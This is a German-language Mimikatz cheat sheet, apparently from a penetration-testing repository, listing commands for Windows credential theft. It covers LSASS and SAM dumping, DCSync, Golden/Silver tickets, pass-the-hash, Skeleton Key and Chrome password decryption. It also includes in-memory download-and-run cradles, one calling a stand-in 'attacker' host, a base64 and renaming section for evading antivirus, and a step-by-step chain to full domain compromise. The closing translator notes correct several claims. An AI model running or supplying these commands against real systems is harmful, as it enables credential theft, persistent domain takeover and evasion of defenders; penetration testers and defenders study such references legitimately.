# 🔑 Mimikatz – vollständiger Spickzettel

<!-- language-home-navigation -->
[🏠 Deutsche Startseite](../../README.de.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ███╗   ███╗██╗███╗   ███╗██╗██╗  ██╗ █████╗ ████████╗███████╗
  ████╗ ████║██║████╗ ████║██║██║ ██╔╝██╔══██╗╚══██╔══╝╚══════╝
  ██╔████╔██║██║██╔████╔██║██║█████╔╝ ███████║   ██║   ███████╗
  ██║╚██╔╝██║██║██║╚██╔╝██║██║██╔═██╗ ██╔══██║   ██║   ╚════██║
  ██║ ╚═╝ ██║██║██║ ╚═╝ ██║██║██║  ██╗██║  ██║   ██║   ███████║
  ╚═╝     ╚═╝╚═╝╚═╝     ╚═╝╚═╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚══════╝
               Werkzeug zum Auslesen von Windows-Zugangsdaten
```

<p align="center">
  <img src="https://img.shields.io/badge/Mimikatz-Post_Exploitation-red?style=for-the-badge" alt="Mimikatz">
  <img src="https://img.shields.io/badge/Windows-Credentials-blue?style=for-the-badge" alt="Zugangsdaten">
  <img src="https://img.shields.io/badge/Active_Directory-orange?style=for-the-badge" alt="AD">
  <img src="https://img.shields.io/badge/Kerberos-green?style=for-the-badge" alt="Kerberos">
</p>

<p align="center">
  <b>🔓 Ein leistungsfähiges Werkzeug zum Auslesen von Windows-Zugangsdaten</b>
</p>

---

## 📋 Inhaltsverzeichnis

- [Was ist Mimikatz?](#-was-ist-mimikatz)
- [Erste Schritte](#-erste-schritte)
- [Ausführungsmethoden](#-ausführungsmethoden)
- [Kernmodule](#-kernmodule)
- [Zugangsdaten auslesen](#-zugangsdaten-auslesen)
- [Kerberos-Angriffe](#-kerberos-angriffe)
- [Fortgeschrittene Angriffe](#-fortgeschrittene-angriffe)
- [Techniken zur Umgehung der Erkennung](#-techniken-zur-umgehung-der-erkennung)
- [Kurzreferenz](#-kurzreferenz)

---

## 🎯 Was ist Mimikatz?

**Mimikatz** ist ein von **Benjamin Delpy** (@gentilkiwi) entwickeltes Werkzeug für Aktionen nach dem Erstzugang (Post-Exploitation). Es ermöglicht das Auslesen folgender Daten:

- 🔑 **Klartextpasswörter** aus dem Windows-Arbeitsspeicher (LSASS)
- 🎫 **Kerberos-Tickets** (TGT, TGS)
- 🔐 **NTLM-Hashes** aus SAM/NTDS
- 📜 **Zertifikate** und private Schlüssel
- 🗝️ **Zwischengespeicherte Anmeldedaten**
- 🔒 **DPAPI-Secrets**

### Warum ist Mimikatz relevant?

| Anwendungsfall | Beschreibung |
| ---------- | ------------- |
| **Diebstahl von Zugangsdaten** | Passwörter aus dem Arbeitsspeicher auslesen |
| **Seitwärtsbewegung im Netzwerk** | Pass-the-Hash, Pass-the-Ticket |
| **Rechteausweitung** | Die Identität eines Benutzers annehmen |
| **Persistenz** | Golden/Silver Tickets |
| **Kontrolle über die Domäne** | DCSync zur vollständigen Kompromittierung von Active Directory |

---

## 🚀 Erste Schritte

### Herunterladen

```bash
# Offizielles Repository
git clone https://github.com/gentilkiwi/mimikatz.git

# Vorkompilierte Programmdateien (Releases)
# https://github.com/gentilkiwi/mimikatz/releases
```

### Voraussetzungen

- **Administrator-/SYSTEM-Rechte** (für die meisten Funktionen)
- **SeDebugPrivilege** (für den Zugriff auf LSASS)
- Windows x64 oder x86

### Erste Befehle

```cmd
# Mimikatz starten
mimikatz.exe

# Berechtigungen prüfen
mimikatz # privilege::debug
Privilege '20' OK

# Alle Berechtigungen aktivieren
mimikatz # token::elevate

# Beenden
mimikatz # exit
```

---

## 💻 Ausführungsmethoden

### 1. Eigenständige Programmdatei

```cmd
# Direkte Ausführung (wird laut Vorlage vom Virenschutz erkannt)
mimikatz.exe

# Einzeiler
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Ausgabe in eine Datei schreiben
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > output.txt

# Mit dem Befehl log
mimikatz.exe "log output.log" "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

### 2. PowerShell (Invoke-Mimikatz)

```powershell
# Herunterladen und im Arbeitsspeicher ausführen (ohne separate Programmdatei)
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'

# Zugangsdaten auslesen
Invoke-Mimikatz -DumpCreds

# Zertifikate auslesen
Invoke-Mimikatz -DumpCerts

# Auf einem entfernten Rechner ausführen
Invoke-Mimikatz -ComputerName DC01
```

### 3. Metasploit (Kiwi)

```bash
# In einer Meterpreter-Sitzung
meterpreter > load kiwi

# Hilfe aufrufen
meterpreter > help kiwi

# Alle Zugangsdaten auslesen
meterpreter > creds_all

# Hashes auslesen
meterpreter > lsa_dump_sam

# Secrets auslesen
meterpreter > lsa_dump_secrets

# Kerberos-Tickets
meterpreter > kerberos_ticket_list
meterpreter > kerberos_ticket_use /path/to/ticket.kirbi
```

### 4. CrackMapExec

```bash
# SAM auslesen
crackmapexec smb 192.168.1.0/24 -u admin -p password --sam

# LSA-Daten auslesen
crackmapexec smb 192.168.1.0/24 -u admin -p password --lsa

# NTDS-Daten auslesen
crackmapexec smb dc01.domain.local -u admin -p password --ntds
```

### 5. Aus einem Speicherabbild

```cmd
# LSASS-Speicherabbild mit Task-Manager oder procdump erstellen
procdump.exe -ma lsass.exe lsass.dmp

# Speicherabbild in Mimikatz laden
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

---

## 🔧 Kernmodule

### Modulübersicht

| Modul | Beschreibung |
| -------- | ------------- |
| **sekurlsa** | Zugangsdaten aus dem LSASS-Arbeitsspeicher auslesen |
| **lsadump** | SAM, NTDS, Secrets und Cache-Daten auslesen |
| **kerberos** | Kerberos-Tickets verändern |
| **crypto** | CryptoAPI-Zertifikate |
| **vault** | Windows Vault (Anmeldeinformationsverwaltung) |
| **token** | Tokens verändern |
| **privilege** | Berechtigungen verändern |
| **process** | Prozesse beeinflussen |
| **service** | Dienste beeinflussen |
| **dpapi** | DPAPI-Secrets |
| **misc** | Verschiedene Befehle |

### Hilfe aufrufen

```cmd
# Alle Module auflisten
mimikatz # ::

# Hilfe zum Modul
mimikatz # sekurlsa::
mimikatz # lsadump::
mimikatz # kerberos::
```

---

## 🔐 Zugangsdaten auslesen

### Modul sekurlsa (LSASS)

```cmd
# Zuerst die Debug-Berechtigung aktivieren!
mimikatz # privilege::debug

# Alle Anmeldedaten auslesen (Klartext, NTLM, SHA1)
mimikatz # sekurlsa::logonpasswords

# Nur NTLM-Hashes auslesen
mimikatz # sekurlsa::msv

# Kerberos-Tickets auslesen
mimikatz # sekurlsa::tickets

# WDigest-Zugangsdaten auslesen (Klartext, falls aktiviert)
mimikatz # sekurlsa::wdigest

# Kerberos-Verschlüsselungsschlüssel auslesen
mimikatz # sekurlsa::ekeys

# DPAPI-Zugangsdaten auslesen
mimikatz # sekurlsa::dpapi

# Zugangsdaten eines bestimmten Prozesses auslesen
mimikatz # sekurlsa::logonpasswords /process:lsass.exe

# TsPkg-Zugangsdaten auslesen (RDP)
mimikatz # sekurlsa::tspkg

# LiveSSP-Zugangsdaten auslesen
mimikatz # sekurlsa::livessp

# SSP-Zugangsdaten auslesen
mimikatz # sekurlsa::ssp

# CloudAP-Zugangsdaten auslesen (Azure AD)
mimikatz # sekurlsa::cloudap
```

### Modul lsadump (SAM/NTDS)

```cmd
# SAM-Datenbank auslesen (lokale Konten)
mimikatz # lsadump::sam

# SAM mithilfe der SYSTEM-Registry-Struktur auslesen
mimikatz # lsadump::sam /system:SYSTEM /sam:SAM

# LSA-Secrets auslesen
mimikatz # lsadump::secrets

# Zwischengespeicherte Anmeldedaten auslesen (DCC2)
mimikatz # lsadump::cache

# DCSync (Replikation eines Domänencontrollers)
mimikatz # lsadump::dcsync /domain:domain.local /user:Administrator
mimikatz # lsadump::dcsync /domain:domain.local /all /csv

# NTDS.dit auslesen (Domänencontroller)
mimikatz # lsadump::lsa /patch
mimikatz # lsadump::lsa /inject

# Schlüssel für Vertrauensstellungen auslesen
mimikatz # lsadump::trust /patch

# Sicherungsschlüssel auslesen (DPAPI)
mimikatz # lsadump::backupkeys /system:dc01.domain.local /export
```

### Modul vault (Anmeldeinformationsverwaltung)

```cmd
# Vault-Zugangsdaten auflisten
mimikatz # vault::list

# Vault-Zugangsdaten auslesen
mimikatz # vault::cred /patch
```

### Modul dpapi

```cmd
# DPAPI-Masterschlüssel auslesen
mimikatz # dpapi::masterkey /in:masterkey_file /sid:user_sid /password:password

# DPAPI-Datenblock entschlüsseln
mimikatz # dpapi::blob /in:blob_file /masterkey:key

# Chrome-Passwörter
mimikatz # dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /unprotect
```

---

## 🎫 Kerberos-Angriffe

### Tickets anzeigen

```cmd
# Alle Tickets auflisten
mimikatz # kerberos::list

# Tickets mit Einzelheiten auflisten
mimikatz # kerberos::list /export

# Alle Tickets exportieren
mimikatz # sekurlsa::tickets /export
```

### Pass-the-Ticket (PtT)

```cmd
# Vorhandene Tickets entfernen
mimikatz # kerberos::purge

# Ticket importieren
mimikatz # kerberos::ptt ticket.kirbi

# Ticket prüfen
mimikatz # kerberos::list
```

### Golden Ticket (Persistenz mit Domänenadministratorrechten)

```cmd
# Voraussetzungen:
# - Domänenname (domain.local)
# - Domänen-SID (S-1-5-21-...)
# - NTLM-Hash des krbtgt-Kontos
# - Zielbenutzername (kann laut Original erfunden sein)

# Golden Ticket erstellen
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:ntlm_hash /ptt

# Erstellen und exportieren
mimikatz # kerberos::golden /user:fakeadmin /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:hash /ticket:golden.kirbi

# Mit bestimmten Gruppen (laut Vorlage RID 500 = Admin, 512 = Domain Admins usw.)
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:hash /groups:500,501,513,512,520,518,519 /ptt

# Mit Ziel-Domänencontroller
mimikatz # kerberos::golden /user:admin /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:hash /sids:S-1-5-21-xxx-519 /ptt
```

### Silver Ticket (dienstspezifisch)

```cmd
# Voraussetzungen:
# - Domänenname
# - Domänen-SID
# - NTLM-Hash des Ziel-Dienstkontos
# - Dienst-SPN

# Silver Ticket für CIFS erstellen (Dateifreigaben)
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /target:server.domain.local /service:cifs /rc4:service_hash /ptt

# Silver Ticket für HTTP (Web)
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /target:web.domain.local /service:http /rc4:hash /ptt

# Silver Ticket für SQL
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /target:sql.domain.local /service:MSSQLSvc /rc4:hash /ptt

# Silver Ticket für WinRM/PSRemoting
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /target:server.domain.local /service:http /rc4:hash /ptt
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /target:server.domain.local /service:wsman /rc4:hash /ptt
```

---

## 💀 Fortgeschrittene Angriffe

### Pass-the-Hash (PtH)

```cmd
# Befehl mit dem NTLM-Hash eines Benutzers ausführen
mimikatz # sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:hash /run:cmd.exe

# Mit AES-Schlüsseln
mimikatz # sekurlsa::pth /user:Administrator /domain:domain.local /aes256:aes_key /run:powershell.exe

# Prozess mit PtH starten
mimikatz # sekurlsa::pth /user:admin /domain:. /ntlm:hash /run:"powershell -ep bypass"
```

### Overpass-the-Hash (Pass-the-Key)

```cmd
# NTLM in ein Kerberos-Ticket umwandeln
mimikatz # sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:hash /run:cmd.exe

# Anschließend ein TGT anfordern
# klist sollte das Kerberos-Ticket anzeigen
```

### DCSync-Angriff

```cmd
# Einzelnen Benutzer replizieren
mimikatz # lsadump::dcsync /domain:domain.local /user:Administrator

# krbtgt replizieren (für ein Golden Ticket)
mimikatz # lsadump::dcsync /domain:domain.local /user:krbtgt

# Alle Benutzer replizieren
mimikatz # lsadump::dcsync /domain:domain.local /all /csv

# Von einem bestimmten Domänencontroller replizieren
mimikatz # lsadump::dcsync /domain:domain.local /dc:DC01.domain.local /user:Administrator
```

### Skeleton Key

```cmd
# Skeleton Key in LSASS des Domänencontrollers einfügen (alle Benutzer können sich laut Vorlage mit "mimikatz" anmelden)
mimikatz # misc::skeleton

# Persistenz bis zum Neustart des Domänencontrollers
# Anmeldung mit beliebigem Benutzer: password = mimikatz
```

### Missbrauch von DPAPI

```cmd
# Masterschlüssel auslesen
mimikatz # sekurlsa::dpapi

# Datei mit Anmeldedaten entschlüsseln
mimikatz # dpapi::cred /in:C:\Users\user\AppData\Local\Microsoft\Credentials\xxx /masterkey:key

# Gespeicherte RDP-Passwörter
mimikatz # dpapi::rdg /in:rdp_file.rdg /masterkey:key
```

### Token-Manipulation

```cmd
# Tokens auflisten
mimikatz # token::list

# SYSTEM-Rechte erlangen
mimikatz # token::elevate

# Die Identität eines bestimmten Benutzers annehmen
mimikatz # token::elevate /user:Administrator

# Zum ursprünglichen Token zurückkehren
mimikatz # token::revert

# Als bestimmter Benutzer ausführen
mimikatz # token::run /user:domain\admin
```

---

<a name="-techniken-zur-umgehung-der-erkennung"></a>

## 🛡️ Techniken zur Umgehung der Erkennung

### Verschleierte Dateinamen

```cmd
# mimikatz.exe umbenennen
rename mimikatz.exe m.exe
rename mimikatz.exe totally_legit.exe
```

### PowerShell-Verschleierung

```powershell
# Mit Base64 kodieren
$command = "IEX (New-Object Net.WebClient).DownloadString('http://attacker/Invoke-Mimikatz.ps1')"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encoded = [Convert]::ToBase64String($bytes)
powershell -enc $encoded
```

### Ausführung nur im Arbeitsspeicher

```powershell
# Invoke-Mimikatz (ohne separate Programmdatei)
IEX (New-Object Net.WebClient).DownloadString('http://attacker/Invoke-Mimikatz.ps1')
Invoke-Mimikatz

# Alternativ Kiwi in Meterpreter verwenden
meterpreter > load kiwi
meterpreter > creds_all
```

### Alternativen für LSASS-Speicherabbilder

```cmd
# Procdump (von Microsoft signiert)
procdump.exe -ma lsass.exe lsass.dmp

# comsvcs.dll (im Betriebssystem enthalten)
rundll32.exe comsvcs.dll, MiniDump <lsass_pid> dump.dmp full

# Task-Manager (grafische Oberfläche)
# Rechtsklick auf lsass.exe > Speicherabbilddatei erstellen

# SQLDumper (aus SQL Server)
sqldumper.exe <lsass_pid> 0 0x01100
```

### Umgehung von Credential Guard

```cmd
# Prüfen, ob Credential Guard aktiviert ist
mimikatz # sekurlsa::logonpasswords
# Zeigt laut Vorlage "ERROR kuhl_m_sekurlsa_acquireLSA"

# Alternative: Stattdessen DCSync verwenden
mimikatz # lsadump::dcsync /domain:domain.local /user:Administrator
```

---

## 📊 Kurzreferenz

### Wichtige Einzeiler

```cmd
# Alle Zugangsdaten auslesen
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# SAM auslesen
mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"

# Alle Konten mit DCSync replizieren
mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:domain.local /all /csv" "exit"

# Golden Ticket
mimikatz.exe "privilege::debug" "kerberos::golden /user:admin /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:hash /ptt" "exit"

# Pass-the-Hash
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:admin /domain:domain.local /ntlm:hash /run:cmd.exe" "exit"
```

### Kurzreferenz der Module

| Befehl | Beschreibung |
| --------- | ------------- |
| `privilege::debug` | Debug-Berechtigung aktivieren |
| `token::elevate` | SYSTEM-Rechte erlangen |
| `sekurlsa::logonpasswords` | Alle Zugangsdaten aus LSASS auslesen |
| `sekurlsa::msv` | NTLM-Hashes auslesen |
| `sekurlsa::tickets` | Kerberos-Tickets auslesen |
| `sekurlsa::pth` | Pass-the-Hash |
| `lsadump::sam` | SAM-Datenbank auslesen |
| `lsadump::secrets` | LSA-Secrets auslesen |
| `lsadump::dcsync` | DCSync-Angriff |
| `lsadump::lsa /patch` | NTDS-Daten vom Domänencontroller auslesen |
| `kerberos::list` | Kerberos-Tickets auflisten |
| `kerberos::ptt` | Pass-the-Ticket |
| `kerberos::golden` | Golden/Silver Ticket erstellen |
| `kerberos::purge` | Tickets entfernen |
| `vault::list` | Vault-Zugangsdaten auflisten |
| `dpapi::cred` | DPAPI-Zugangsdaten entschlüsseln |

### Beispiel einer Angriffskette

```
1. Erstzugang erlangen
2. privilege::debug
3. sekurlsa::logonpasswords (Zugangsdaten auslesen)
4. sekurlsa::pth (Seitwärtsbewegung im Netzwerk)
5. lsadump::dcsync /user:krbtgt (krbtgt-Hash auslesen)
6. kerberos::golden (Golden Ticket erstellen)
7. Vollständige Kompromittierung der Domäne!
```

---

## 📚 Ressourcen

- [Offizielles GitHub-Repository](https://github.com/gentilkiwi/mimikatz)
- [Mimikatz Wiki](https://github.com/gentilkiwi/mimikatz/wiki)
- [Mimikatz-Leitfaden von ADSecurity](https://adsecurity.org/?page_id=1821)
- [Mimikatz bei HackTricks](https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-mimikatz)

### Verwandte Spickzettel
- [Rechteausweitung unter Windows](../../Windows-PrivEsc/README.md)
- [Metasploit](../../Metasploit/translations/README.de.md)
- [Meterpreter](../../Metasploit/translations/Meterpreter.de.md)

---

<p align="center">
  <b>🔑 Angriffe auf Windows-Zugangsdaten verstehen und beherrschen!</b><br>
  <i>Mimikatz – ein vielseitiges Werkzeug für Windows-Sicherheitstests</i>
</p>

---

## Hinweise zur deutschen Ausgabe

> **Begriffe und Voraussetzungen:** *LSASS* ist der Windows-Prozess für lokale Sicherheitsfunktionen; *SAM* enthält lokale Kontodaten, *NTDS* die Active-Directory-Datenbank. *DPAPI* schützt benutzer- beziehungsweise systemgebundene Secrets. Ein Speicherabbild enthält nicht zwangsläufig Klartextpasswörter. Berechtigungen, Windows-Version, Anmeldeverfahren und Schutzmechanismen bestimmen, welche Daten verfügbar sind. Ein Fehler mit `kuhl_m_sekurlsa_acquireLSA` allein ist kein verlässlicher Nachweis für aktiviertes Credential Guard. DCSync verwendet AD-Replikation und setzt entsprechende Domänenrechte voraus; es ist kein pauschaler Credential-Guard-Bypass. [Microsoft: Credential Guard](https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/how-it-works).

> **Korrekturen zur Vorlage:** `token::elevate` nimmt die Identität eines geeigneten vorhandenen Tokens an; es aktiviert nicht einfach alle Berechtigungen und garantiert keinen erfolgreichen SYSTEM-Zugriff. `lsadump::lsa /patch` und `/inject` fragen LSA-/SAM-/AD-Daten ab; sie exportieren nicht die Datei `NTDS.dit`. Die Kurzbeschriftungen im Original sind daher vereinfachend. [Mimikatz: Token-Modul](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kuhl_m_token.c), [Mimikatz: Lsadump-Modul](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kuhl_m_lsadump.c).

> **Kerberos und Versionen:** `/sids` fügt zusätzliche SIDs in das Ticket ein; die damit beschriftete Zeile wählt keinen Ziel-Domänencontroller aus. Benutzer-RIDs und Gruppen-RIDs sind unterschiedliche Angaben. Historische Ticketbeispiele, fiktive Namen, RC4-Annahmen und Platzhalter sind keine allgemeine Funktionszusage für aktuelle Domänen. Auch Skeleton Key, Browserentschlüsselung und ältere PowerSploit-/CrackMapExec-Beispiele hängen von Version und Konfiguration ab. [Mimikatz: Kerberos-Implementierung](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kerberos/kuhl_m_kerberos.c).

> **Interpreter und Erkennung:** Mit `cmd` oder `bash` markierte Blöcke enthalten teilweise Mimikatz- beziehungsweise Meterpreter-Konsolenbefehle und sind keine unmittelbar ausführbaren Shell-Skripte. Führende `#`-Zeilen erklären die Beispiele; in `cmd.exe` sind sie keine gültige Kommentarsyntax. Umbenennen, Base64-Kodierung, signierte Hilfsprogramme und speicherbasierte Ausführung garantieren weder Spurenfreiheit noch eine Umgehung von AV/EDR. Die ursprünglichen Befehle und Ausgabe-Literale wurden unverändert belassen und nicht ausgeführt.
